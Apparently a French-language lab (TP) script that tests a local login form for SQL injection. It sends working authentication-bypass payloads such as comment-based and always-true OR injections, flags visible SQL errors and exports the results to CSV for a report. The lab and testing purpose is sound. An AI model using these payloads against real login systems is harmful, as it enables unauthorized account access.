import csv
import time
import requests
from dataclasses import dataclass
from typing import List


BASE_URL = "http://127.0.0.1:5000"
OUTPUT_CSV = "resultats_injections.csv"


@dataclass
class TestCase:
    name: str
    username: str
    password: str
    expected_success: bool
    category: str
    description: str


TEST_CASES: List[TestCase] = [
    TestCase(
        name="Connexion valide",
        username="admin",
        password="admin123",
        expected_success=True,
        category="normal",
        description="Vérifie qu'un utilisateur légitime peut se connecter."
    ),
    TestCase(
        name="Connexion invalide",
        username="admin",
        password="fauxmotdepasse",
        expected_success=False,
        category="normal",
        description="Vérifie qu'un mauvais mot de passe est refusé."
    ),

    # Injections de contournement d'authentification
    TestCase(
        name="Commentaire SQL sur le mot de passe",
        username="admin' --",
        password="nimportequoi",
        expected_success=True,
        category="sql_injection",
        description="Le commentaire SQL ignore la condition sur le mot de passe."
    ),
    TestCase(
        name="Condition toujours vraie",
        username="admin' OR '1'='1' --",
        password="nimportequoi",
        expected_success=True,
        category="sql_injection",
        description="La condition OR rend la clause WHERE vraie."
    ),
    TestCase(
        name="Condition toujours vraie avec autre syntaxe",
        username="' OR 1=1 --",
        password="x",
        expected_success=True,
        category="sql_injection",
        description="Injection générique qui ne dépend pas forcément du nom admin."
    ),
    TestCase(
        name="Bypass avec commentaire bloc",
        username="admin'/*",
        password="*/ OR '1'='1",
        expected_success=False,
        category="sql_injection",
        description="Test de commentaire bloc. Peut échouer selon la requête exacte."
    ),

    # Tests qui doivent normalement échouer
    TestCase(
        name="Tentative utilisateur inexistant",
        username="doesnotexist",
        password="test",
        expected_success=False,
        category="negative",
        description="Un utilisateur inexistant ne doit pas se connecter."
    ),
    TestCase(
        name="Entrée vide",
        username="",
        password="",
        expected_success=False,
        category="negative",
        description="Les champs vides ne doivent pas permettre la connexion."
    ),
    TestCase(
        name="Apostrophe simple seule",
        username="'",
        password="test",
        expected_success=False,
        category="error_detection",
        description="Permet d'observer si une erreur SQL est visible."
    ),
]


def send_login(username: str, password: str):
    """
    Envoie une requête POST au formulaire de connexion.
    """
    start = time.time()

    try:
        response = requests.post(
            BASE_URL,
            data={
                "username": username,
                "password": password
            },
            timeout=5
        )

        elapsed_ms = round((time.time() - start) * 1000, 2)

        return {
            "status_code": response.status_code,
            "text": response.text,
            "elapsed_ms": elapsed_ms,
            "error": None
        }

    except requests.exceptions.RequestException as exc:
        elapsed_ms = round((time.time() - start) * 1000, 2)

        return {
            "status_code": None,
            "text": "",
            "elapsed_ms": elapsed_ms,
            "error": str(exc)
        }


def is_success(response_text: str) -> bool:
    """
    Adapte cette fonction au texte affiché par ton application.
    """
    success_keywords = [
        "Connexion réussie",
        "Bienvenue",
        "connecté",
        "role",
        "ADMIN",
        "USER"
    ]

    failure_keywords = [
        "incorrect",
        "refusée",
        "Erreur d’authentification",
        "Erreur d'authentification"
    ]

    text_lower = response_text.lower()

    if any(keyword.lower() in text_lower for keyword in success_keywords):
        return True

    if any(keyword.lower() in text_lower for keyword in failure_keywords):
        return False

    return False


def detect_sql_error(response_text: str) -> bool:
    """
    Détecte si l'application affiche une erreur SQL.
    En production, ce serait une mauvaise pratique.
    """
    sql_error_keywords = [
        "syntax error",
        "psycopg2",
        "sql",
        "postgres",
        "unterminated quoted string",
        "Internal Server Error",
        "Traceback"
    ]

    text_lower = response_text.lower()

    return any(keyword.lower() in text_lower for keyword in sql_error_keywords)


def short_response(response_text: str, max_len: int = 180) -> str:
    """
    Nettoie l'affichage de la réponse HTML pour le terminal.
    """
    cleaned = " ".join(response_text.replace("\n", " ").split())

    if len(cleaned) > max_len:
        return cleaned[:max_len] + "..."

    return cleaned


def run_tests():
    print("=" * 90)
    print("TESTS SQL INJECTION - ENVIRONNEMENT LOCAL DE TP")
    print("=" * 90)
    print(f"URL testée : {BASE_URL}")
    print()

    results = []

    for index, test in enumerate(TEST_CASES, start=1):
        response = send_login(test.username, test.password)

        success = is_success(response["text"])
        sql_error = detect_sql_error(response["text"])
        passed = success == test.expected_success and response["error"] is None

        result = {
            "numero": index,
            "nom": test.name,
            "categorie": test.category,
            "username": test.username,
            "password": test.password,
            "succes_observe": success,
            "succes_attendu": test.expected_success,
            "test_valide": passed,
            "erreur_sql_visible": sql_error,
            "status_code": response["status_code"],
            "temps_ms": response["elapsed_ms"],
            "erreur_requete": response["error"],
            "description": test.description
        }

        results.append(result)

        print("=" * 90)
        print(f"[{index}] {test.name}")
        print(f"Catégorie       : {test.category}")
        print(f"Description     : {test.description}")
        print(f"Username envoyé : {test.username!r}")
        print(f"Password envoyé : {test.password!r}")
        print(f"Code HTTP       : {response['status_code']}")
        print(f"Temps réponse   : {response['elapsed_ms']} ms")
        print(f"Succès observé  : {success}")
        print(f"Succès attendu  : {test.expected_success}")
        print(f"Erreur SQL visible : {sql_error}")
        print(f"Résultat test   : {'OK' if passed else 'ÉCHEC / À ANALYSER'}")

        if response["error"]:
            print(f"Erreur requête  : {response['error']}")
        else:
            print(f"Extrait réponse : {short_response(response['text'])}")

    write_csv(results)
    print_summary(results)


def write_csv(results):
    """
    Exporte les résultats dans un fichier CSV.
    """
    fieldnames = [
        "numero",
        "nom",
        "categorie",
        "username",
        "password",
        "succes_observe",
        "succes_attendu",
        "test_valide",
        "erreur_sql_visible",
        "status_code",
        "temps_ms",
        "erreur_requete",
        "description"
    ]

    with open(OUTPUT_CSV, mode="w", newline="", encoding="utf-8") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)


def print_summary(results):
    total = len(results)
    passed = sum(1 for result in results if result["test_valide"])
    failed = total - passed
    injections_successful = [
        result for result in results
        if result["categorie"] == "sql_injection" and result["succes_observe"]
    ]
    sql_errors = [
        result for result in results
        if result["erreur_sql_visible"]
    ]

    print()
    print("=" * 90)
    print("RÉSUMÉ")
    print("=" * 90)
    print(f"Nombre total de tests       : {total}")
    print(f"Tests conformes à l'attendu : {passed}")
    print(f"Tests à analyser            : {failed}")
    print(f"Injections réussies         : {len(injections_successful)}")
    print(f"Erreurs SQL visibles        : {len(sql_errors)}")
    print(f"Export CSV                  : {OUTPUT_CSV}")

    print()
    print("Conclusion possible pour le rapport :")

    if injections_successful:
        print(
            "- L'application est vulnérable aux injections SQL, car certaines entrées "
            "modifient la logique de la requête et permettent une connexion sans mot de passe valide."
        )
    else:
        print(
            "- Les injections testées n'ont pas permis de contourner l'authentification. "
            "Cela peut indiquer une correction ou une différence dans l'application testée."
        )

    if sql_errors:
        print(
            "- L'application expose aussi des informations techniques ou des erreurs SQL, "
            "ce qui facilite l'analyse par un attaquant."
        )


if __name__ == "__main__":
    run_tests()
